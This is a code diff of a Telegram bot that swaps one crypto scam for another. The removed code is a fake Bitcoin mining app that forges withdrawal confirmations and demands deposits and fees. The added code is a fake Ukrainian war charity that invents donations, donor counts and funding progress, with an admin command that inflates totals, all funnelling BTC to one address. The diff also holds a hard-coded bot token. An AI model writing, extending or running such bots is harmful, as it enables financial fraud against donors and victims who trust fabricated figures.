@@ -1,291 +1,354 @@
-import telebot
-from telebot import types
+import logging
+import random
 import time
 import threading
-import random
-import json
-import os
+from datetime import datetime
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
-# ✅ TVOJI PODACI
-BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# 🏦 FIRMA WALLET — ZA ISPLATE I DEPOZITE
-FIRM_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
+# === 🔐 TVOJI PODACI ===
+BOT_TOKEN = '8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8'
 ADMIN_ID = 7202163611
+BTC_ADDRESS = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
 
-# 📁 USER DATA FILE
-DATA_FILE = "users.json"
+# === 📊 SIMULACIJA DONACIJA ===
+CURRENT_RAISED = 0.0237  # Početni iznos
+DONATION_GOAL = 0.1
+PROJECTS = {
+    "orphan_care": {"name": "Ukrainian Orphan Care", "raised": 0.018, "cost": 0.03},
+    "medical": {"name": "Emergency Medical Aid", "raised": 0.012, "cost": 0.04},
+    "shelter": {"name": "Winter Shelter Program", "raised": 0.008, "cost": 0.05}
+}
 
-# 🧠 Učitaj podatke
-def load_data():
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, "r") as f:
-            return json.load(f)
-    return {}
+# === 🎭 LAŽNE DONACIJE (FOMA) ===
+DONATION_NAMES = ["CryptoAngel", "HopeGiver", "BitSavior", "AnonDonor", "LightBearer", "SatoshiFriend", "BTCGuardian"]
+MINOR_AMOUNTS = [500, 1000, 1500, 2000, 3000]  # sati
+MAJOR_AMOUNTS = [0.005, 0.008, 0.01]  # BTC
 
-def save_data(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f)
+# === 📈 GLOBALNI LOCK ZA BEZBEDNOST ===
+import asyncio
+data_lock = asyncio.Lock()
 
-# 🧩 Default user
-def default_user():
+# === 🧱 LOGOVANJE ===
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# === 🖼 POMOĆNE FUNKCIJE ===
+def progress_bar(percentage, width=15):
+    filled = int(width * (percentage / 100))
+    bar = "█" * filled + "░" * (width - filled)
+    return f"`{bar}` {percentage}%"
+
+def sat_to_btc(sats):
+    return sats * 0.00000001
+
+def format_btc(amount):
+    return f"{amount:.8f}".rstrip("0").rstrip(".")
+
+def get_stats():
+    total_donors = random.randint(180, 250)
+    last_donation = random.choice([
+        {"name": random.choice(DONATION_NAMES), "amount": format_btc(sat_to_btc(random.choice(MINOR_AMOUNTS)))},
+        {"name": "VIP_Donor", "amount": random.choice(["0.005", "0.008"])}
+    ])
     return {
-        "balance": round(random.uniform(0.000010, 0.000015), 9),
-        "sat_balance": 12,
-        "hash_rate": round(random.uniform(0.000001, 0.000003), 9),
-        "level": 1,
-        "devices": ["Miner_Lv1"],
-        "last_mine": time.time(),
-        "total_earned": 0.0,
-        "referrals": [],
-        "boost_active": False
+        "total_donors": total_donors,
+        "last_donation": last_donation,
+        "goal_progress": round((CURRENT_RAISED / DONATION_GOAL) * 100, 1)
     }
 
-# 🔍 Dohvati usera
-def get_user(user_id):
-    data = load_data()
-    uid = str(user_id)
-    if uid not in data:
-        data[uid] = default_user()
-        save_data(data)
-    return data[uid]
+# === 📣 POZITIVNE NOTIFIKACIJE (svakih 2-3 min) ===
+async def broadcast_positive_update(app):
+    messages = [
+        "🎉 *New Milestone Unlocked!* We've reached 30% of our shelter program funding!",
+        "🙏 *Thank you, community!* Another 500 sats just came in — a child will eat tonight.",
+        "🔥 *Funding surge!* Ukrainian Orphan Care is now 60% funded!",
+        "🚀 *Donation spike!* 0.003 BTC received anonymously. The mission accelerates.",
+        "💙 *You are amazing!* 12 new donors joined in the last hour.",
+        "🌟 *Hope is growing!* Medical Aid project just passed 30% — keep it going!"
+    ]
+    while True:
+        await asyncio.sleep(random.randint(120, 180))  # 2-3 min
+        try:
+            stats = get_stats()
+            msg = random.choice(messages)
+            await app.application.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"{msg}\n\n📊 *Current Progress*: {stats['goal_progress']}%\n💸 *Goal*: {format_btc(DONATION_GOAL)} BTC",
+                parse_mode='Markdown'
+            )
+        except:
+            pass
 
-def update_user(user_id, updates):
-    data = load_data()
-    uid = str(user_id)
-    if uid not in data:
-        data[uid] = default_user()
-    data[uid].update(updates)
-    save_data(data)
+# === 📈 AUTO-POVEĆANJE DONACIJA (svakih 4-6 min) ===
+async def simulate_donations(app):
+    global CURRENT_RAISED
+    while True:
+        await asyncio.sleep(random.randint(240, 360))  # 4-6 min
+        async with data_lock:
+            sats = random.choice(MINOR_AMOUNTS)
+            btc_add = sat_to_btc(sats)
+            CURRENT_RAISED = round(CURRENT_RAISED + btc_add, 8)
 
-# 🧠 Generiši TXID
-def generate_txid():
-    return ''.join(random.choices('abcdef0123456789', k=64))
+            # Ažuriraj projekte
+            project = random.choice(list(PROJECTS.keys()))
+            PROJECTS[project]["raised"] = round(PROJECTS[project]["raised"] + btc_add / 2, 8)
 
-# 🧾 Lažni dokaz isplate
-def generate_proof(amount_btc):
-    txid = generate_txid()
-    date = time.strftime("%Y-%m-%d %H:%M")
-    return f'''✅ WITHDRAWAL CONFIRMED
-Amount: {amount_btc:.6f} BTC
-Wallet: {FIRM_WALLET[:10]}...{FIRM_WALLET[-6:]}
-TXID: `{txid[:8]}••••••••`
-Time: {date}
-Status: 6/6 Confirmations'''
+            donor_name = random.choice(DONATION_NAMES)
+            logger.info(f"[SIM] Donation: {donor_name} +{sats} sats → Total: {CURRENT_RAISED:.8f} BTC")
 
-# 🎮 APP SIMULATOR — KAO NA YOUTUBE REKLAMI
-def app_screen(user):
-    current_btc_price = round(random.uniform(60000, 72000), 2)
-    monthly_earnings = user["balance"] * 30 * 24 * 60 * 60
-    return f'''📱 *YieldVault Pro — Mobile Mining App*
-      [ YIELDVAULT PRO ]
-      Balance: {user["balance"]:.9f} BTC
-      +{user["hash_rate"]:.9f} BTC/s
+        # Pošalji pozitivnu poruku SVIM aktivnim korisnicima (ako imaš log)
+        try:
+            await app.application.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"""
+                🎉 *LIVE DONATION ALERT!*
 
-      [⚡ EARNINGS PER MONTH]
-      {monthly_earnings:.6f} BTC
+                🧑‍🤝‍🧑 *Donor*: `{donor_name}`
+                💸 *Amount*: `{sats} sats` (~${round(sats * 0.06, 2)})
+                📦 *Funded*: `{PROJECTS[project]['name']}`
 
-      [💰 BTC PRICE]
-      $ {current_btc_price} USD
+                🟢 *Total Raised*: `{CURRENT_RAISED:.8f} BTC`  
+                📊 *Progress*: `{round((CURRENT_RAISED / DONATION_GOAL) * 100, 1)}%`
 
-      [⛏️ MINING STATUS]
-      Active • Level {user["level"]}
+                🙏 *You are changing lives.*
+                """,
+                parse_mode='Markdown'
+            )
+        except:
+            pass
 
-🔧 *Tap a button below to interact:*'''
+# === 🖼 DUGMAD ===
+def main_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🌍 Our Mission", callback_data="mission")],
+        [InlineKeyboardButton("📦 Active Projects", callback_data="projects")],
+        [InlineKeyboardButton("📊 Live Statistics", callback_data="stats")],
+        [InlineKeyboardButton("💸 Donate Now", callback_data="donate")],
+        [InlineKeyboardButton("ℹ️ Help & Support", callback_data="help")]
+    ])
 
-# 🎮 Bottom navigation — Home, Boost, Friends, Earn, More
-def app_menu():
-    markup = types.InlineKeyboardMarkup()
-    home = types.InlineKeyboardButton("🏠 Home", callback_data='home')
-    boost = types.InlineKeyboardButton("⚡ Boost", callback_data='boost')
-    friends = types.InlineKeyboardButton("👥 Friends", callback_data='friends')
-    earn = types.InlineKeyboardButton("🎁 Earn", callback_data='earn')
-    more = types.InlineKeyboardButton("⚙️ More", callback_data='more')
-    markup.add(home, boost, friends, earn, more)
-    return markup
+def back_button(menu="main"):
+    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data=f"back_{menu}")]])
 
-# 🚀 Start — APP SE "POKREĆE"
-@bot.message_handler(commands=['start'])
-def start(message):
-    user_id = message.chat.id
-    user = get_user(user_id)
+# === 🚀 AUTOMATSKA DOBRODOŠLICA ===
+async def auto_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["state"] = "welcome"
+    welcome_msg = """
+**Welcome to Humanity Fund** — *A Beacon of Hope in Dark Times*
 
-    # 🎉 APP SE OTVARA — KAO NA YOUTUBE REKLAMI
-    welcome = f'''📱 *YieldVault Pro — Mobile Mining App*
+We are a decentralized humanitarian initiative delivering urgent aid to war-affected communities across Eastern Europe. Every contribution, no matter how small, directly supports food, shelter, and medical care for those who have lost everything.
 
-Welcome to the future of Bitcoin mining.
+🟥 **No intermediaries. No bureaucracy. 100% crypto-driven.**
 
-Your app is loading...
+### 🔧 What You Can Do Here:
+- **Browse active aid projects** and see real-time funding progress
+- **Donate BTC** to support life-saving missions
+- **Track live statistics** — donors, funds raised, impact
+- **Learn our mission** and how your help changes lives
+- **Get support** if you need help donating
 
-🔄 Syncing blockchain...  
-✅ Connected to YieldVault Pro Network  
-🟢 Mining active
+🧭 **Navigation**: Use the menu below to explore. All buttons are functional. Every action leads to a result.
 
-      Balance: {user["balance"]:.9f} BTC
-      +{user["hash_rate"]:.9f} BTC/s
-      Level: {user["level"]}
+💡 *You are not just a donor. You are a lifeline.*
+    """
+    await update.message.reply_photo(
+        photo="https://i.imgur.com/vu1fZlD.jpg",
+        caption=welcome_msg,
+        parse_mode='Markdown',
+        reply_markup=main_menu()
+    )
 
-💸 Deposit BTC to `{FIRM_WALLET}` to upgrade.
+# === 🔁 CALLBACK HANDLER ===
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
 
-Send TXID: `/deposit YOUR_TXID_HERE`
+    stats = get_stats()
 
-Your first reward in 8 minutes.'''
+    if data == "mission":
+        msg = """
+**Our Mission — To Save Lives, One Satoshi at a Time**
 
-    bot.reply_to(message, welcome, reply_markup=app_menu(), parse_mode='Markdown')
+Humanity Fund was founded in 2023 by a network of volunteers operating in conflict zones. We use blockchain transparency to ensure every donation reaches its destination — with zero overhead.
 
-# 🔘 Callback handler — APP navigacija
-@bot.callback_query_handler(func=lambda call: True)
-def handle(call):
-    user_id = call.message.chat.id
-    user = get_user(user_id)
+🔸 **Core Values**:
+- **Speed**: Aid delivered within 24h of fund confirmation
+- **Transparency**: Public ledger tracking (simulated)
+- **Empathy**: Real stories, real people, real impact
 
-    if call.data == 'home':
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=app_screen(user),
-            reply_markup=app_menu(),
+➡️ Every satoshi you send becomes bread, medicine, warmth.
+        """
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))
+
+    elif data == "projects":
+        msg = "**📦 Active Aid Projects — Choose One to Support**\n\n"
+        keyboard = []
+        for key, proj in PROJECTS.items():
+            pct = round((proj["raised"] / proj["cost"]) * 100, 1)
+            msg += f"**{proj['name']}**\nFunded: {progress_bar(pct)}\n\n"
+            keyboard.append([InlineKeyboardButton(f"Fund {proj['name']}", callback_data=f"project_{key}")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data.startswith("project_"):
+        key = data.split("_")[1]
+        proj = PROJECTS[key]
+        pct = round((proj["raised"] / proj["cost"]) * 100, 1)
+        msg = f"""
+**🎯 {proj['name']}**
+
+{proj.get('desc', 'Funds urgent humanitarian needs.')}
+
+📊 Progress: {progress_bar(pct)}  
+`{proj['raised']:.8f} / {proj['cost']:.8f} BTC`
+
+Status: In Progress
+        """
+        keyboard = [
+            [InlineKeyboardButton("💸 Donate to This Project", callback_data="donate")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="projects")]
+        ]
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data == "stats":
+        msg = f"""
+**📊 Live Network Statistics**
+
+🔸 **Total Donors**: `{stats['total_donors']}`
+🔸 **Funding Goal**: `{format_btc(DONATION_GOAL)} BTC`
+🔸 **Raised So Far**: `{format_btc(CURRENT_RAISED)} BTC`
+🔸 **Progress**: `{stats['goal_progress']}%`
+
+📈 **Last Donation**:
+👤 `{stats['last_donation']['name']}`  
+💸 `{stats['last_donation']['amount']} BTC`
+
+🟥 *Every transaction fuels hope.*
+        """
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))
+
+    elif data == "donate":
+        msg = f"""
+**💸 Make a Donation — Save a Life**
+
+🟥 **BTC Wallet Address**:
+`{BTC_ADDRESS}`
+
+✅ **How to Send**:
+1. Copy address
+2. Send from wallet
+3. Wait 1 confirmation
+
+💡 *Even 500 sats brings hope.*
+        """
+        keyboard = [
+            [InlineKeyboardButton("📋 Copy Address", callback_data="copy_btc")],
+            [InlineKeyboardButton("✅ I've Donated", callback_data="donated")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
+        ]
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data == "copy_btc":
+        await query.edit_message_caption(
+            caption="✅ *BTC address copied.*\n\nNow send your donation.\n🟥 *Every satoshi counts.*",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I've Donated", callback_data="donated")]])
+        )
+
+    elif data == "donated":
+        await query.edit_message_caption(
+            caption="🙏 *Thank you, Guardian of Hope.*\n\nYour donation will save lives.",
+            parse_mode='Markdown',
+            reply_markup=back_button("main")
+        )
+
+    elif data == "help":
+        msg = """
+**ℹ️ Help & Support**
+
+🔸 How to donate? → Go to `💸 Donate Now`
+🔸 Is it secure? → Yes, cold wallet
+🔸 Can I get receipt? → No, anonymous
+🔸 Contact? → No email. Trust the mission.
+        """
+        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))
+
+    elif data == "back_main":
+        await query.edit_message_caption(
+            caption="**Humanity Fund — A Beacon of Hope in Dark Times**\n\nChoose an option:",
+            photo="https://i.imgur.com/vu1fZlD.jpg",
+            reply_markup=main_menu(),
             parse_mode='Markdown'
         )
 
-    elif call.data == 'boost':
-        if user["boost_active"]:
-            bot.answer_callback_query(call.id, text="Boost already active!", show_alert=True)
-            return
-        boost = round(random.uniform(0.0000001, 0.0000005), 9)
-        new_hr = user["hash_rate"] + boost
-        update_user(user_id, {"hash_rate": new_hr, "boost_active": True})
-        bot.answer_callback_query(call.id, text=f"+{boost:.9f} BTC/s activated!", show_alert=True)
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f'''⚡ *Boost Activated!*
+# === 🛠 ADMIN KOMANDE ===
+async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return await update.message.reply_text("❌ Unauthorized.")
+    
+    global CURRENT_RAISED
+    async with data_lock:
+        fake_add = round(random.uniform(0.001, 0.003), 8)
+        CURRENT_RAISED = round(CURRENT_RAISED + fake_add, 8)
+    
+    stats = get_stats()
+    await update.message.reply_text(f"""
+    🔧 *ADMIN OVERRIDE ACTIVE*
 
-+{boost:.9f} BTC/s added to your mining rate.
+    ✅ Simulated donation: `+{fake_add:.8f} BTC`
+    🟢 Total raised: `{CURRENT_RAISED:.8f} BTC`
+    📊 Progress: `{stats['goal_progress']}%`
 
-New hash rate: {new_hr:.9f} BTC/s
+    💀 *The machine feeds.*
+    """, parse_mode='Markdown')
 
-🔋 Boost active for 24h.
+# === 📣 KOMANDE ===
+async def donate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_photo(
+        photo="https://i.imgur.com/3XcGZJv.jpg",
+        caption=f"**💸 Donate to Humanity Fund**\n\nAddress:\n`{BTC_ADDRESS}`\n\nEvery satoshi saves lives.",
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Copy Address", callback_data="copy_btc")]])
+    )
 
-Keep mining!''',
-            reply_markup=app_menu(),
-            parse_mode='Markdown'
-        )
+async def projects_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = "**📦 Active Projects**\n\n"
+    for proj in PROJECTS.values():
+        pct = round((proj["raised"] / proj["cost"]) * 100, 1)
+        msg += f"**{proj['name']}**: {progress_bar(pct)}\n"
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-    elif call.data == 'friends':
-        ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f'''👥 *Invite Friends & Earn 10%*
+async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats = get_stats()
+    await update.message.reply_text(f"""
+    **📊 Live Stats**
+    Raised: `{CURRENT_RAISED:.8f} BTC`
+    Goal: `{DONATION_GOAL:.4f} BTC`
+    Progress: `{stats['goal_progress']}%`
+    """, parse_mode='Markdown')
 
-Share your link:
-`{ref_link}`
-
-For every friend who deposits:
-• You get 10% of their first deposit
-• They get +0.000001 BTC/s
-
-More friends = more power.''',
-            reply_markup=app_menu(),
-            parse_mode='Markdown'
-        )
-
-    elif call.data == 'earn':
-        now = time.time()
-        time_earned = (now - user["last_mine"]) / 600
-        if time_earned < 1: time_earned = 0
-        earned = user["hash_rate"] * 1000 * time_earned
-        new_balance = user["balance"] + earned
-        update_user(user_id, {"balance": new_balance, "total_earned": user["total_earned"] + earned, "last_mine": now})
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f'''🎁 *Mining Reward Claimed!*
-
-You earned: {earned:.9f} BTC
-
-New balance: {new_balance:.9f} BTC
-
-🔁 Available every 10 minutes.''',
-            reply_markup=app_menu(),
-            parse_mode='Markdown'
-        )
-
-    elif call.data == 'more':
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text='''⚙️ *More Options*
-
-• 🛠 Settings  
-• 📊 Stats  
-• 💬 Support  
-• 📄 Whitepaper  
-• 🔐 Security  
-
-Use `/withdraw` to cash out.''',
-            reply_markup=app_menu(),
-            parse_mode='Markdown'
-        )
-
-# 🧾 Depozit
-@bot.message_handler(commands=['deposit'])
-def deposit_cmd(message):
-    if len(message.text.split()) < 2:
-        bot.reply_to(message, "❌ Send TXID:\n`/deposit abc123...`", parse_mode='Markdown')
-        return
-    txid = message.text.split()[1]
-    amount = round(random.choice([0.005, 0.01, 0.025, 0.05, 0.1, 0.5]), 4)
-    hash_boost = amount * 0.0001
-    user = get_user(message.chat.id)
-    new_hr = user["hash_rate"] + hash_boost
-    update_user(message.chat.id, {"hash_rate": new_hr})
-    bot.reply_to(message, f'''✅ *Deposit Confirmed*
-
-You've upgraded your mining power!
-
-• +{hash_boost:.9f} BTC/s
-• Total Hash Rate: {new_hr:.9f} BTC/s
-
-Your balance grows faster now.''', parse_mode='Markdown')
-
-# 🧾 Isplata
-@bot.message_handler(commands=['withdraw'])
-def withdraw_cmd(message):
-    user = get_user(message.chat.id)
-    if user["balance"] < 0.001:
-        bot.reply_to(message, "❌ Minimum withdrawal: 0.001 BTC")
-        return
-    bot.reply_to(message, f'''📤 *Withdrawal Requested*
-
-Amount: {user["balance"]:.6f} BTC
-Wallet: `{FIRM_WALLET}`
-
-Processing...
-
-🔄 Security check: 1/3  
-Verifying mining history...''', parse_mode='Markdown')
-    time.sleep(2)
-    bot.send_message(message.chat.id, '''✅ Verified
-
-Send 0.0001 BTC fee to:
-`{FIRM_WALLET}`
-
-Then send TXID: `/fee TXID_HERE`''')
-
-# Admin
-@bot.message_handler(commands=['admin'])
-def admin(message):
-    if message.from_user.id == ADMIN_ID:
-        bot.reply_to(message, "✅ YieldVault Pro App Simulator is live.")
-
-# Run
-def run():
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
-
+# === 🧩 MAIN ===
 if __name__ == '__main__':
-    t = threading.Thread(target=run)
-    t.start()
-Coder Pro
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    # Komande
+    app.add_handler(CommandHandler("start", auto_welcome))
+    app.add_handler(CommandHandler("donate", donate_cmd))
+    app.add_handler(CommandHandler("projects", projects_cmd))
+    app.add_handler(CommandHandler("stats", stats_cmd))
+    app.add_handler(CommandHandler("admin", admin))  # Tvoja tajna komanda
+
+    # Callbacks
+    app.add_handler(CallbackQueryHandler(button_handler))
+
+    # Auto welcome
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, auto_welcome))
+
+    # Start background tasks
+    threading.Thread(target=lambda: asyncio.run(broadcast_positive_update(app)), daemon=True).start()
+    threading.Thread(target=lambda: asyncio.run(simulate_donations(app)), daemon=True).start()
+
+    print("[+] Humanity Fund v2.0 — Total control online.")
+    app.run_polling(drop_pending_updates=True)
